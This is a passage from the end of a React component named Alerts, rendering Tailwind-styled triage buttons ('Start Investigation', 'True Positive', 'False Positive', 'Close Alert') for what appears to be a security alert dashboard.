                <button className="flex items-center justify-center gap-1.5 px-2.5 py-1.5 text-[10px] font-semibold rounded bg-blue-950/40 text-blue-400 border border-blue-900/30 hover:bg-blue-900/30 transition-colors">
                  <Play className="w-3 h-3" />
                  Start Investigation
                </button>
                <button className="flex items-center justify-center gap-1.5 px-2.5 py-1.5 text-[10px] font-semibold rounded bg-green-950/40 text-green-500 border border-green-900/30 hover:bg-green-900/30 transition-colors">
                  <ThumbsUp className="w-3 h-3" />
                  True Positive
                </button>
                <button className="flex items-center justify-center gap-1.5 px-2.5 py-1.5 text-[10px] font-semibold rounded bg-orange-950/40 text-orange-400 border border-orange-900/30 hover:bg-orange-900/30 transition-colors">
                  <ThumbsDown className="w-3 h-3" />
                  False Positive
                </button>
                <button className="flex items-center justify-center gap-1.5 px-2.5 py-1.5 text-[10px] font-semibold rounded bg-neutral-800/40 text-neutral-500 border border-neutral-700/30 hover:bg-neutral-700/30 transition-colors">
                  <XCircle className="w-3 h-3" />
                  Close Alert
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default Alerts;
